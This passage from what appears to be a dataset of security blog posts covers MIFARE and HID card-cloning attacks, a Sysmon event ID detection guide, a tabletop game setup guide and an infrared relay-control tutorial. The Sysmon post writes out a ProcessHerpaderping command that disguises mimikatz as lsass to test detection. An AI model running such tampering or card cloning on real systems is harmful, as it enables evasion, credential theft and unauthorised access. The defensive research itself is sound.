at https://github.com/nfc-tools.\n\nMFCUK (also known as the Darkside Attack) uses flaws in the pseudo-random number generator (PRNG) and error responses of the card to leak partial bits of the keystream, to eventually obtain one of the sector keys.  This attack is only used if not a single key is known for any given sector on the MIFARE Classic card.  While this is a rare occasion, it does happen, and this attack can take literally hours to complete.  Basically, the main goal is to find one key using MFCUK and then move on to the other attack method, MFOC.  \n\nMFOC (also known as the nested attack), first authenticates to a sector using a known key, whether that be a default key or one found from MFCUK, to then perform a nested authentication to the other sectors.  In this process, some bits of the keystream can be leaked, and eventually, the entire key can be recovered.  This is then performed for all unknown keys, and eventually to a point where all of the keys are known.  Once all keys are known the card can then be completely duplicated or cloned.\n\nSummary\n\nThis has proved to be a very rewarding research project and has provided me with a much deeper understanding of RFID in general and the tools available to explore the many facets of contactless technology. In particular, my research exposed potential areas of vulnerability with HID low frequency (125kHz) 26-bit proximity cards and tags. The absence of security on these cards makes it extremely easy to clone these cards and impersonate the owner, thereby gaining access to areas normally off-limits. Unfortunately, in my opinion, there is no easy fix for this, short of expensive mass upgrades of their existing equipment (readers and access control panels), redistribution of new RFID cards, and extensive changes to existing back-end software. For this reason, many businesses opt to remain status quo until situations arise that warrant the costly upgrades. Even the Wiegand protocol used for communicating with the access control back-end is based on old 1980's technology.\n\nFurthermore, the evolution of MIFARE 1k Classic high frequency (13.56MHz) cards as a means to provide the security lacking in the older HID technology, fell short of its delivery when it's proprietary (Crypto1) algorithm was ultimately compromised. Fortunately for NXP, the MIFARE design provides a means to improve on security going forward, as demonstrated by their MIFARE Plus, MIFARE DESFire, and MIFARE EV1 cards.\n\nRFID technology has been around for a long time and is constantly evolving, offering even better security, greater data storage capacity, and more robust features. In my opinion, contactless cards, tags, and badges will be around for many more years to come. For me, this has proven to be a fascinating and highly enlightening study of a surprisingly often overlooked wireless technology. RFID devices are everywhere, used for security clearance, hotel rooms, public transportation, parking garages, debit and credit cards, anti-theft devices,  tracking assets and people, and much more. The technology can be found in schools and universities, libraries, law enforcement, retail businesses, hospitals and healthcare industries, government agencies, and on and on.\n\nIn closing I'll add, the focus of this write-up was to not only document my research of RFID technology in a structured manner for my own benefit but to also demonstrate the many options available for others to learn and experiment with it as well. Hopefully, you'll find it as rewarding as I have, and in turn, strive to understand it's implications with regard to its impact on information security. As for me, I intend on doing some further RFID research, focusing my attention on long-range readers and how they can be modified into tools that passively sniff credentials.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"A Sysmon Event ID Breakdown - Updated to Include 29!!\"\nTaxonomies: \"Author, How-To, Informational, InfoSec 101, Jordan Drysdale, Jordan Drysdale, Sysmon\"\nCreation Date: \"Fri, 08 Jan 2021 13:17:00 +0000\"\nJordan Drysdale //\n\nUPDATES! October 30, 2023There's been an additional update for Sysmon! Event ID 29!Another Event ID (EID) was added to the Sysmon service. This event ID followed the same incremental ID scheme and landed on EID29. Like the previous update, this update has been echo'd to the end of this article. \n\nDecember 22, 2022 So \u2013 there have been some changes to Sysmon and this blog needed polishing. The latest Event IDs and descriptions are now included for Sysmon 26, File Delete Detected, Sysmon 27, File Block Executable, and Sysmon 28, File Block Shredding. All you have to do is keep scrolling; the new events have been added in this blog\u2019s format under the event ID number\u2019s heading and description. \n\ntl;dr\n\nThis blog is being provided to demonstrate the capabilities of Sysmon logging broken down by event ID. The IDs will be captured in context and matched to their sysmon-modular configuration section for tuning opportunities. \n\nPlease allow me a shout out here to the author of the sysmon-modular repository on Github. Olaf has graciously provided the community one of the best tuning platforms and rapid configuration file deployment tools available for Sysmon (what this is will be explained). First tho: \n\n@olafhartong\n\n@falconforceteam\n\ngithub.com/olafhartong/sysmon-modular\n\nSo, what is a Sysmon configuration file? The config file (for short) provides the directives that govern exactly what Sysmon writes to logs. Take, for example, the following selection of the configuration file I built with sysmon-modular for this article. \n\nEvent ID 1: Process Creation\n\nThe previous configuration directive states that under Event ID 1, Process Creation, one of the listed images must be matched. This is not even close to the complete list of image names listed under modular\u2019s Event ID 1 config block. The selection is intended to demonstrate the capability of sysmon modular. So, let\u2019s install Sysmon and review.\n\nAnd let\u2019s have bitsadmin attempt a file download for us. \n\nThe simple instantiation of a bitsadmin command caused the following match from the previous screenshot. If you take a moment and scroll back up to the modular configuration, you should notice another interesting tidbit. Each image\u2019s configuration section includes a potential MITRE ATT&CK map. As shown below and matched above, use of the Bitsadmin.exe image matches against T1197, BITS jobs (https://attack.mitre.org/techniques/T1197/). \n\nEvent ID 2: Process Changed a File Creation Time\n\nEvent ID 2 has not been useful in my experience, though is probably useful for forensic investigators. The technique is called \u201cTimestomping\u201d and the articles listed below include the MITRE page and a SpectreOps article that has a PoC. The final item of note here is that the modular repo is referencing MITRE T1099, which has been deprecated in lieu of T1070.006. The parent technique is now \u201cIndicator Removal on Host\u201d with the sub-technique being \u201ctimestomp.\u201d More on this another day in a different blog. \n\nLinks:\n\nhttps://posts.specterops.io/revisiting-ttps-timestomper-622d4c28a655\n\nhttps://attack.mitre.org/techniques/T1070/006/\n\nEvent ID 3: Network Connections\n\nEvent ID 3s are for documenting network connections. The established image names and connection types from the modular configuration then result in mapped techniques. In the following screenshot, we can see an RDP connection from a workstation to another IP off-subnet. While this is a benign connection, we do see the MITRE ATT&CK technique mapped to T1021 (remote services). \n\nEvent IDs 4, 5: Sysmon Service Changes\n\nEvent ID 4 is not filterable. This is reported in the event of a Sysmon service state change.\n\nSysmon event ID 5 appears to be a rare event. I was able to trigger this event by restarting the Sysmon service.\n\nBased on a review of the modular configuration file, the images had to be loaded and unloaded from userland, temp, or \\Windows\\temp. \n\nEvent ID 6: Driver Loaded\n\nEvent ID 6 was also rare. It is described as \u201cDriver Loaded\u201d and systems on this particular network had reported no Sysmon event ID 6's in the last 24 hour period.\n\nEvent ID 7: Image Loaded\n\nEvent ID 7 covers image load operations and the processes that instantiate them.\n\nThis event was mapped to T1073 (DLL Side-Loading), which has been deprecated in lieu of T1574.002. The parent technique in this instance is Hijack Execution Flow, with the sub-technique listed as DLL Side-Loading. \n\nLink:\n\nhttps://attack.mitre.org/techniques/T1574/002/\n\nWhile technically MS Defender is \u201cside-loading\u201d a DLL, this is a great opportunity for introducing the theory of event tuning. In this situation, we should review the modular configuration directories, structure, and make sure we understand how sysmon-modular was designed to handle this exact situation. Take the following screenshot, which has both an exclude and an include statement - these must exist in separate RuleGroups. \n\nTo exclude the MpCmdRun.exe image from the event ID 7 configuration block, we had to create a completely new RuleGroup, otherwise, on config file update, an error would be thrown. Another item of note is that there is no explicit \u201cEvent ID ##\u201d configuration section, the rules are processed by the listings that we can match against the sysmon operational log (shown below). \n\nFor example, to create new RuleGroups for the identified rules, we would use syntax similar to the following. \n\n  \n    \n  \n\n  \n    \n  \n\nEvent ID 8: CreateRemoteThread\n\nMoving on now to event ID 8, CreateRemoteThread. This event ID was also rare but had occurred once each day on the system being analyzed for this blog. One of the events was a graphics driver.\n\nThe other event was worthy of investigation and appeared as follows. \n\nEvent ID 9: RawAccessRead\n\nEvent ID 9 is listed as RawAccessRead events. Randy Franklin Smith (ultimatewindowssecurity.com fame) describes this event as being reported when \u201ca process conducts reading operations from the drive using the \\\\.\\ denotation.\u201d After further reading, this is what is listed on the Sysinternals site for sysmon as well. No event ID 9s had been reported by this system. \n\nLinks:\n\nhttps://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90009 \n\nhttps://docs.microsoft.com/en-us/sysinternals/downloads/sysmon\n\nEvent ID 10: ProcessAccess\n\nEvent ID 10 is a very interesting event and is listed as ProcessAccess. This occurs when an image requests a \u201cpriv\u201d to access another process. As shown in the next screenshot, MS Defender asked to take a quick peek at LSASS and the system granted the appropriate access.\n\nLink:\n\nhttps://cyberwardog.blogspot.com/2017/03/chronicles-of-threat-hunter-hunting-for_22.html\n\nEvent ID 11: File Creation Events\n\nEvent ID 11 covers file creation events. This can be very useful in detections, forensics, and investigations. With some basic creation rules in place, Sysmon EID11 can provide an early warning system for write operations in userland. \n\nQuick stepback here to provide a definition for \u201cuserland.\u201d \n\nUserland or user space (noun):\n\nIn the context of computing, this can refer to all code that runs in low privilege processes, outside admin or kernel context. For restrictive environments, users should have limited privilege to write to a workstation\u2019s disk, normally locations including C:\\users\\%username%\\ or in some cases redirected user locations to network shares. \n\nAs shown in the next screenshot, .bat and .cmd file creation events are logged to disk. \n\nThe creation of both a .cmd and .bat file are then logged to disk. \n\nEvent IDs 12, 13, 14: Registry Objects\n\nThese event IDs are related to registry events. \n\nRegObject added/deleted (HKLM / HKU) \n\nRegValue set (DWORD / QWORD additions) \n\nRegObject renamed \n\nA selection of the configuration parameters for the registry related events is shown below. \n\nEvent IDs 12 and 13 were relatively common and likely need some tuning. I did not see event ID 14 during the creation of this blog. \n\nEvent ID 15: FileCreateStreamHash\n\nEvent ID 15 covers events related to file streams, generally downloads via web browser. As shown below, we see chrome.exe download the build_collector.py file from the CrackMap archives. Note the zone.identifier file highlighted in the event content referred to in the Sysinternals page for sysmon as the \u201cmark of the web.\u201d \n\nA PowerShell download was not caught with this particular event ID but could have been captured with Event ID 11 had the configuration file been properly tuned to catch .zip files. \n\nEvent ID 16: Sysmon Config Change\n\nA very simple event ID to interpret is EID16: Sysmon Config Change. \n\nEvent IDs 17 and 18: Pipe Events\n\nThese event IDs are related to Pipe Events. \n\nEvent ID 17: Pipe Created\n\nEvent ID 18: Pipe Connected\n\nPentest tools, malware tools, and lots of other software often utilize the SMB protocol. Pipes are a means over which an SMB client can establish a connection to a remotely available process. There is clearly some value in monitoring these events.\n\nSysmon modular\u2019s configuration for these event IDs is an exclude first operation. Some common pipe event offenders are listed in the resultant config file, shown below.\n\nLinks:\n\nhttps://docs.microsoft.com/en-us/dotnet/standard/io/how-to-use-named-pipes-for-network-interprocess-communication\n\nhttps://book.hacktricks.xyz/pentesting/pentesting-smb\n\nEvent IDs 19, 20, 21: WMI Events\n\nEID19 WMIEventFilters\n\nEID20 WMIEventConsumer\n\nEID21 WMIEventConsumertoFilter\n\nWMI events can be noisy and will depend on the environment. Enabling full logging of WMI can cause a lot of logs. The default configuration parameters for modular are to include events where any of the EventFilters, EventConsumers, or EventConsumertoFilters are listed as created in the produced event content. \n\nI was unable to generate a matching event using the command line in an attempt to have wmic open a command shell.\n\nIt is probable that Olaf has implemented the best possible solution for the noise of WMIC and related events. Additional investigations may be warranted, though at this time, capturing WMI events in this fashion is recommended. \n\nLink:\n\nhttps://redcanary.com/threat-detection-report/techniques/windows-management-instrumentation\n\nEvent ID 22: DNSEvents\n\nDNS events are useful and when coupled with event ID 3, network connection and file write events can help produce a complete picture. However\u2026\u2026.like a lot of things on a network, these can be very noisy. The modular approach to this has been to exclude known domains and log the rest. \n\nAbout 20% of the logged Sysmon events on this lab system were EID22, so clearly, this event is up for review as to its usefulness. In the grand scheme of logging, threat hunting, ETW, investigations, etc, I might err here on the side of relying on my resolver\u2019s logs, proxy-based defenses, and its logging capabilities, rather than on the endpoint. \n\nEvent ID 23: FileDelete\n\nAnother really cool addition to the Sysmon event family was this one! As a forensic investigator might say, \u201cshow me the malware.\u201d A lot of hackers clean up after themselves and this tool allows us the opportunity to retain archival copies when files are created in defined spaces (userland) and are subsequently deleted, thus event ID 23 - FileDelete. \n\nThis event was harder to trigger than I\u2019d imagined, prior to reviewing the structure of sysmon modular\u2019s config. Let\u2019s review, for example, the \\Downloads\\ section of the config. \n\nI tried to create files that matched these extensions (caught by EID 11) and then delete them. This did not result in the expected events. After reviewing these groupRelation configuration parameters, it appeared that the logical \u201cand\u201d operator was the issue. After modifying the config file and updating the local operating installation, I was able to trigger EID23 under these defined conditions. As of December 28, 2020, the modular repo could use a pull request to fix this logical flaw. The fix appeared to be as simple as shown below (\u201cor\u201d not \u201cand\u201d). \n\nA selection of the filtered event logs are shown below. \n\nAnd finally, the files deleted from userland were copied to the RestrictedContainer as directed by the Sysmon configuration. \n\nEvent ID 24: Clipboard Changes\n\nThis event was initially reviewed with skepticism, since...well\u2026 copies of the contents of the clipboard may end up in another archive location. This content will include passwords and other sensitive materials, so caution should be taken to implement this.\n\nEvent ID 25: Process Tampering \n\nSysmon version 13 added process tampering to address Johnny Shaw\u2019s process herpaderping technique (based on hollowing, etc). To confirm this would catch the technique, after compiling the project, I used the compiled ProcessHerpaderping.exe file and executed it.  \n\nAs shown in the previous screenshot, I used ProcessHerpaderping.exe with the mimikatz.exe to build a file called sysmon.exe stuffed with lsass.exe\u2019s signature bits. \n\nThis results in capture!!!! We can all catch process tampering now.  \n\nBut, let\u2019s take a quick look at the reverse of this process. First, we reviewed the Event ID 25, Process Tampering. But, the first event, Event ID 1, caught a process creation event. As shown below, we also see the partial command line. Possible IOC? Sorry about the next screenshot, for readability\u2019s sake, I cropped it - but, whole command here: \n\n.\\ProcessHerpaderping.exe mimikatz.exe sysmon25.exe C:\\Windows\\System32\\lsass.exe \n\nWe also see the .exe created by this process in the Event ID 11: File Creation. \n\nLooking at the event viewer, it is clear that some flags went off prior to execution, and at a minimum we should be able to help the forensics team sort out what happened. \n\nWell, there is one more.  \n\nEvent ID 26: File Delete Detection\n\nLet\u2019s say the adversary wanted to cover their tracks by deleting their artifacts. This Event ID strikes me as an either/or EID23 (file delete archive) or EID26 (file delete). Really, you could grow your archive location to an obscene size if you are archiving everything. But maybe that is exactly what you want. If so, go with Event ID 23 and archive the deletions that match your config file\u2019s logic. Otherwise, if all you want to know is when users delete matching files, go with Event ID 26.\n\nEvent ID 27: File Block Executable \n\nThis is one of my favorite additions to the Sysmon engine. Incredibly articulate answer to a basic problem: We don\u2019t want our users downloading exe\u2019s from the Internet. The following config file chunk accomplishes blocking exe\u2019s downloaded to c:\\users\\*\\Downloads (thanks Olaf, H/T on the wildcard). Please note the config chunk below covers config changes necessary for EID 27 and EID 28. \n\nLet\u2019s assume I try to download a file from the Internet, like Chrome.exe. Denied. Game over. Easy peasy.\n\nWe have discussed userland and write permissions, administrative access, and lots of related topics. Let\u2019s boil this down to this \u2013 users should have limited permissions to write to their local systems. The better your userland configuration is, the easier this protection will be to implement. By limiting write privileges on disk, you have also narrowed your optics focus in Sysmon. This demo relied entirely on the default browser configuration downloading the .exe to C:\\users\\someuser\\Downloads\\ and could be easily bypassed. Limit write access and configure those locations for denial with Sysmon. \n\nEvent ID 28: File Block Shredding \n\nThis is the latest event ID added to Sysmon and was designed to deny shredding tools like sdelete from thrashing files on disk. As an example shown below, we see the adversary trying to shred the malicious Firefox Installer.exe file from the downloads directory. Sysmon stepped in here and denied the operation. \n\nIn event logs, we see the following. Sysmon blocked the shredding operation. \n\nEvent ID 29: File Block Executable \n\nThis event ID was designed to capture executables, specifically PE format type which includes EXE\u2019s, DLL\u2019s, and object code. The configuration file will also need to be updated and, as always, Olaf and Falcon Force have the bits needed to understand proper implementation. In testing, we had to add a chunk under the bits to cover userland at c:\\users\\. \n\nWe tested three specific conditions. We tested a file download with Edge, which got caught. \n\nWe tried to copy a file over an RDP session with Explorer and got caught.  \n\nFinally, we also used PowerShell to move a copied file to a new name. And....we got caught.  \n\nIn summation, this addition will provide another opportunity for high-level visibility into the end user environment and what they might be up to at any given point. While noise was limited due to the amazing work implemented in the Sysmon Modular framework, our recommendation will remain implement first, and work through your log noise reduction strategies later.  \n\nWell, there is one more.  \n\nEvent ID 255: Errors\n\nAnd that\u2019s it. It was a long journey to get here and I\u2019d like to thank a few folks who made this possible.\n\n@bhinfosecurity for a platform\n\n@strandjs for all the support\n\n@olafhartong for modular\n\n@markrussinovich for Sysmon\n\nHappy hunting!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Backdoors & Breaches - Tabletop Simulator Guide\"\nTaxonomies: \"Backdoors & Breaches, Fun & Games, How-To, Informational\"\nCreation Date: \"Mon, 15 Mar 2021 19:11:47 +0000\"\nEdward Miro //\n\nBackdoors & Breaches is now available as an official Workshop Mod for Tabletop Simulator!\n\nBackdoors & Breaches (B&B) contains 52+ unique cards to help you conduct incident response tabletop exercises and learn attack tactics, tools, and methods. This post is a guide for getting a virtual B&B game going.\n\nNote: New attack, defense. and inject cards will be added periodically.\n\nThis is a multi-step process, but it's not difficult. Our mod is built with Tabletop Simulator (TTS) and is hosted on the TTS Workshop. TTS runs on the Steam Platform.\n\nNote: this guide is designed for Windows users, but you can do the same on Mac or Linux. TTS and the B&B mod work on any platform. \u200b\n\nhttps://backdoorsandbreaches.com\n\n\u200bWhat you will learn from this guide:\n\nHow to install SteamHow to install Tabletop Simulator (TTS)How to access the \"Backdoors & Breaches\" modSome gameplay basics to get you started\n\nHow to install Steam\n\n\u200bIf you don't already have Steam installed, that's okay. It's super easy to get and free to install. Head over to: https://store.steampowered.com/\n\nNow click \"Install Steam\" in the upper right-hand corner: \u200b\n\n\u200bOn the next screen, click \"Install Steam\":\u200b\n\n\u200bSave the 'SteamSetup.exe' file, then run the installer. Select your language, choose an install location, and at the end click 'Finish\" to run Steam: \u200b\n\n\u200bAt this point either sign in with a previously made account or click 'CREATE A NEW ACCOUNT...' to make a new account. Once your account is set up and you're logged into Steam, then proceed to the next step.\n\n\u200bHow to install Tabletop Simulator\n\nFrom the main 'Steam' menu, search using the 'search the store' search box in the upper left for 'Tabletop Simulator'. It should be the first result and will look like this: \u200b\n\n\u200bNow just 'Add to Cart\", and after purchasing... \u200b(you will need to purchase TTS, but the B&B mod will be a free workshop subscription)\n\n\u200b...it will be added to your 'LIBRARY': \u200b\n\n\u200bDouble-click it and then select 'Play Tabletop Simulator' to open TTS. (if you have a vr rig, this is also supported) \u200b\n\n\u200bNow you're ready for the last step: \u200b\n\n\u200bHow to access the \"Backdoors & Breaches\" mod\n\nIn your browser, head to:\n\nhttps://steamcommunity.com/sharedfiles/filedetails/?id=2401033477\n\nNote: if that doesn't work, you can also access the TTS Workshop directly and search 'BHIS' in the search box.\n\nClick on 'Subscribe' at the bottom to add the B&B mod to your saved Workshop games: \u200b\n\nYou can now go back to Tabletop Simulator. Click on 'CREATE' to start a new game: \u200b\n\nSelect either 'Singleplayer, Multiplayer or Hotseat'. Singleplayer will be just for you. Multiplayer allows you to host a game to play with other people who have Tabletop Simulator, and Hotseat allows you to play multiplayer with the same computer. \n\nFor this walkthrough, I'll be selecting Singleplayer: \u200b\n\n\u200bFrom the 'GAMES' menu, we will then select 'Workshop': \u200b\n\n\u200bIf you're new to TTS, your 'WORKSHOP' menu should look like this: \u200b\n\nIf not, you can type 'BHIS' in the search box to filter the items. \n\nClick on 'BHIS Backdoors & Breaches', then 'Load', and you're in: \u200b\n\nSome gameplay basics to get you started\n\nTabletop Simulator Knowledge Base - Controls & Movement \u200b\n\nWant to see the Backdoors & Breaches Tabletop Simulator in action?\n\nhttps://youtu.be/NVZ_ihwVQjY?t=661\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Using Infrared for Hardware Control\"\nTaxonomies: \"Author, Fun & Games, Hardware Hacking, How-To, Informational, Ray Felch\"\nCreation Date: \"Fri, 02 Apr 2021 16:58:17 +0000\"\nRay Felch //\n\nOverview \n\nInfrared technology has been around for a very long time and is a wireless technology used in devices that convey data by way of Infrared radiation. Infrared is electromagnetic radiation (EMR) with a wavelength just beyond the visible light spectrum. Inasmuch, Infrared can not be seen by the naked eye, Fun fact: Although Infrared can not be seen by our eyes, the camera on your phone can capture and display these transmissions just fine! \n\nAs you are probably aware, Infrared technology is used in a great number of applications, such as thermal Imaging cameras, medical applications, military applications (target acquisition, night vision, etc), heating and cooling, and computer peripheral communication, just to name a few. \n\nThe goal of this write-up is to show just how easy it is to not only capture Infrared communication but also to replay the transmission. Initially, I'll show how I was able to capture the IR signals of a couple of remotes I had laying around the house, using Infrared tools available in most Linux repos. \n\nHacking Infrared television remote controls might seem a bit impractical at first glance, however, it can be done very easily and costs practically nothing to accomplish. The wealth of information regarding the Infrared process is most definitely worth the effort. As part of my research, I decided to capture the Infrared button presses of a Kodi (open source media player) remote, an Arduino generic remote, and an HDMI switch remote. I was amazed at how quick and easy it was to retrieve this data! \n\nObjectives \n\nGetting familiar with the NEC IR protocol \n\nUsing a Raspberry Pi and Linux drivers to detect and transmit IR remote codes \n\nUsing IR and Mega2560 module to control relays \n\nIR Protocols (general info) \n\nIn general, an IR Protocol is a set of rules that specify how to transmit a group of bits or bytes. There is a transmitting device (IR emitter diode) which sends these pulses at a specific frequency for a specific amount of time and then pauses for a specific amount of time. Each bit, 0 or 1, is encoded with a specified combination of these timings, which in turn allows for the IR receiver to properly read the transmission. There are quite a few Infrared protocols, but three of the more popular follow: \n\nNEC is a well-known protocol and perhaps is the most widely used. It was developed by NEC and has been adopted by many companies. Its waveform is made of a start frame, a bitstream, and an end of message terminator. \n\nThe NEC IR transmission protocol uses pulse distance encoding of the message bits. Each pulse burst is 562.5\u00b5s in length, at a carrier frequency of 38kHz. Logical bits are transmitted as follows: \n\nLogical '0' \u2013 a 562.5\u00b5s pulse burst followed by a 562.5\u00b5s space, with a total transmit time of 1.125ms \n\nLogical '1' \u2013 a 562.5\u00b5s pulse burst followed by a 1.6875ms space, with a total transmit time of 2.25ms \n\nWhen a key is pressed on the remote controller, the message transmitted consists of the following, in order: \n\n9ms leading pulse burst (16 times the pulse burst length used for a logical data bit) \n\n4.5ms space \n\n8-bit address for the receiving device\n\n8-bit logical inverse of the address \n\n8-bit command \n\n8-bit logical inverse of the command \n\nfinal 562.5\u00b5s pulse burst to signify the end of message transmission \n\nThe four bytes of data bits are each sent least significant bit first. \n\nSIRC is a proprietary protocol by SONY and three variants exist (12, 15, or 20 bits). In all variants, the command field has a fixed length of 7 bits. All the information bits are streamed least significant bit first. \n\n12-bit version, 7 command bits, 5 address bits. \n\n15-bit version, 7 command bits, 8 address bits. \n\n20-bit version, 7 command bits, 5 address bits, 8 extended bits. \n\nPulse width modulation. \n\nCarrier frequency of 40kHz. \n\nBit time of 1.2ms or 0.6ms. \n\nPHILIPS RC5 & RC6 PROTOCOL \n\nRC5 / RC6 Manchester \n\nRC5 and RC6 are two different protocols by Philips, both based on the Manchester coding. Their carrier frequency is set at 36KHz with a recommended PWM duty cycle of 1/4 or 1/3 but not mandatory. \n\nIn Manchester coding the bit time is provided by a constant clock, so both the values 1 and 0 take the same amount of time but in one case the pulse precedes the pause (here this is a logical 0), in the other is the opposite (here this is a logical 1). \n\nTransmitting and Receiving Infrared signals \n\nUsing a Raspberry Pi and Linux IR drivers \n\nGetting familiar with transmitting and receiving Infrared communication can be accomplished fairly quickly using a Raspberry Pi with Raspbian (Buster), an Infrared Linux tool, a few components (TSOP38238 receiver, 940nm emitter diode, and 220-ohm resistor), and some hookup wires. Understanding the intricacies of the various protocols is not necessary, as the work has been done for us, within the Linux drivers. \n\nUsing ir-keytable (a swiss-knife tool to handle Remote Controllers) and the aforementioned circuit, we can detect and decipher remote control button presses. http://manpages.ubuntu.com/manpages/bionic/man1/ir-keytable.1.html \n\nCustomize config.txt: \n\nAs part of this configuration, IR transmission is also configured. If transmission is not needed, exclude dtoverlay=gpio-ir-tx,gpio_pin=15. Some of the output might be different as a result. \n\nUpdate config.txt variables: \n\npi@rasp11:~/infra-red $ sudo nano /boot/config.txt \n\n  # BEGIN ADDED   \n dtoverlay=gpio-ir,gpio_pin=14 \n  #dtoverlay=gpio-ir-tx,gpio_pin=15 \n  # END ADDED \n\nReboot: \n\npi@rasp11:~/infra-red $ sudo reboot \n\nConfirm gpio modules are loaded: \n\npi@rasp11:~/infra-red $ lsmod | grep gpio \n\n  gpio_ir_recv      16384 0 \n\nList devices: \n\ncat /proc/bus/input/devices \n\n  I: Bus=0019 Vendor=0001 Product=0001 Version=0100\n  N: Name=\"gpio_ir_recv\"\n  P: Phys=gpio_ir_recv/input0\n  S: Sysfs=/devices/platform/ir-receiver@e/rc/rc0/input4\n  U: Uniq=\n  H: Handle rs=kbd event4\n  B: PROP=20\n  B: EV=100017\n  B: KEY=fff 0 0 4200 108fc32e 2376051 0 0 0 7 158000 4192 4001 8e9680 0 0 10000000\n  B: REL=3\n  B: MSC=10\n\nInstall ir-keytable: \n\npi@rasp11:~/infra-red $  sudo apt-get install ir-keytable -y \n\nConfirm install: \n\npi@rasp11:~/infra-red $ ir-keytable \n\n  Found /sys/class/rc/rc0/ (/dev/input/event4) with:\n    Name: gpio_ir_recv\n    Driver: gpio_ir_recv, table: rc-rc6-mce\n    LIRC device: /dev/lirc0\n    Attached BPF protocols: Operation not permitted\n    Supported kernel protocols: other lirc rc-5 rc-5-sz jvc sony nec sanyo mce_kbd rc-6 sharp xmp imon\n    Enabled kernel protocols: lirc rc-6\n    bus: 25, vendor/product: 0001:0001, version: 0x0100\n    Repeat delay = 500 ms, repeat period = 125 ms\n\nTest remote: \n\npi@rasp11:~/infra-red $ sudo ir-keytable -p all \n\n  Protocols changed to other lirc rc-5 rc-5-sz jvc sony nec sanyo mce_kbd rc-6 sharp xmp imon \n\nConfirm IR Receiver device is working: \n\npi@rasp11:~/infra-red $ sudo ir-keytable \n\n Found /sys/class/rc/rc0/ (/dev/input/event4) with:\n    Name: gpio_ir_recv\n    Driver: gpio_ir_recv, table: rc-rc6-mce\n    LIRC device: /dev/lirc0\n    Attached BPF protocols:\n    Supported kernel protocols: other lirc rc-5 rc-5-sz jvc sony nec sanyo mce_kbd rc-6 sharp xmp imon\n    Enabled kernel protocols: lirc rc-5 rc-5-sz jvc sony nec sanyo mce_kbd rc-6 sharp xmp imon\n    bus: 25, vendor/product: 0001:0001, version: 0x0100\n    Repeat delay = 500 ms, repeat period = 125 ms\n\nNotice device found as rc0 \n\nNote About rc0 and rc1: \n\nNormally the IR receiver is assigned to /sys/class/rc/rc0. However, due to the nature of multi threaded device probe, the receiver device can be assigned to /sys/class/rc/rc1 \n\nIn the following notes, when ir-keytable is called with -s rc0 and there is no response or an error, use -s r1. If no -s is specified, rc0 is default. However, due to the possibility of the receiver being assigned to rc1 during boot, it is recommended to always specify -s. In this way, if the \u2018wrong\u2019 device is used an error will appear. \n\nTest remote with rc0 (scan button presses loading all protocols): \n\npi@rasp11:~/infra-red $ ir-keytable -t -s rc0 \n\n  Testing events. Please, press CTRL-C to abort. \n\nSample readings on Kodi remote \n\nCaptured codes of all three remote controls \n\nHardware control using Infrared \n\nUsing IR and Mega2560 module to control relays \n\nGeneric remote control \n\nSainsmart 4 channel relay module \n\nMega2560 module \n\nFor this project, we'll be using an Elegoo Mega2560 R3.  The Mega2560 is a microcontroller board based on the ATmega2560. It has 54 digital input/output pins (of which 15 can be used as PWM outputs), 16 analog inputs, 4 UARTs (hardware serial ports), and a 16 MHz crystal oscillator. \n\nThis module is comparable to an Arduino Uno on steroids and at the time of this writing, reasonably priced at just under $40. It is compatible with most shields designed for the Uno and supports flash memory configuring with the  Arduino IDE software environment. \n\nFor this demonstration, I have chosen to attach LEDs to each of the four relays for a visual indication of relay closure. It should be noted that the Sainsmart relays can be configured to control a vast variety of AC/DC  hardware such as lighting, motors, sensors, etc, and are limited only by the voltage/current ratings of the relay chosen. The module used in this demonstration is a four-channel 5-volt relay module capable of handling up to 10A @ 120VAC or 10A @ 28VDC. Each relay provides a normally open or normally closed configuration. I chose to use the normally open set of terminals (LED's normally off). \n\nControl of the four individual relays is pretty straightforward and shown below. To engage a specific relay and activate its corresponding LED the specific input control pin (IN1 - IN4)) needs to be pulled low (GND). \n\nCircuit diagram \n\nUsing the Arduino IDE to flash the Mega2560 \n\nThe following sketch will look for button presses on the Arduino generic remote. Specifically, this sketch will monitor for the 'power', 'mute', 'mode' and 'play' buttons (codes: 0x45, 0x46, 0x47, 0x44 respectively) and upon discovery will engage the corresponding relay channel (IN1 - IN4) to toggle the channel's LED. \n\nPins 39, 37, 35, and 33 on the Mega2560 are defined as output (normally high) and will be pulled low upon discovery of the specific IR code. \n\nSainsmartIR.ino\n\n // Arduino sketch to capture infrared codes and close/open relays based on matching criteria\n // Modified NeoPixel_IR sketch from Adafruit_CircuitPlayground, using IRLibAll library\n // Written to interface with Sainsmart 4 relay module.\n // Author: R.F. Felch 01/28/2021\n \n#include \n\n//IRrecv myReceiver(11);//receiver on pin 11 //Arduino Uno\n IRrecv myReceiver(11);//receiver on pin 32 //Mega2560\n \n IRdecode myDecoder;//Decoder object\n \n // Arduino Uno\n //int play = 8;\n //int mute = 7;\n //int mode = 4;\n //int power = 2;\n \n // Mega2560\n int play = 39;\n int mute = 37;\n int mode = 35;\n int power = 33;\n \n // Channel status false = Relay open true = Relay closed\n bool CH_1 = false;\n bool CH_2 = false;\n bool CH_3 = false;\n bool CH_4 = false;\n \n void setup() {\n pinMode(power, OUTPUT); // Relay channel 1\n pinMode(mode, OUTPUT); // Relay channel 2\n pinMode(mute, OUTPUT); // Relay channel 3\n pinMode(play, OUTPUT); // Relay channel 4\n \n // Set channels high open relay\n digitalWrite(power, HIGH);\n digitalWrite(mode, HIGH);\n digitalWrite(mute, HIGH);\n digitalWrite(play, HIGH);\n \n Serial.begin(115200);\n Serial.println(\"Scanning for IR codes\");\n \n myReceiver.enableIRIn(); // Start the receiver\n }\n \n void loop() { \n if (myReceiver.getResults()) {\n myDecoder.decode();\n if (myDecoder.protocolNum == NEC) {\n //Serial.println(myDecoder.value); // uncomment to view captured values \n switch(myDecoder.value) {\n case 0xffa25d: //Power\n Serial.println(\"Power\");\n if (CH_1 == false) digitalWrite(power, LOW); // close relay ch-1\n if (CH_1 == true) digitalWrite(power, HIGH); // open relay ch-1\n CH_1 = !CH_1;\n break;\n \n case 0xff629d: //Mode\n Serial.println(\"Mode\");\n if (CH_2 == false) digitalWrite(mode, LOW); // close relay ch-2\n if (CH_2 == true) digitalWrite(mode, HIGH); // open relay ch-2\n CH_2 = !CH_2;\n break;\n \n case 0xffe21d: //Mute\n Serial.println(\"Mute\");\n if (CH_3 == false) digitalWrite(mute, 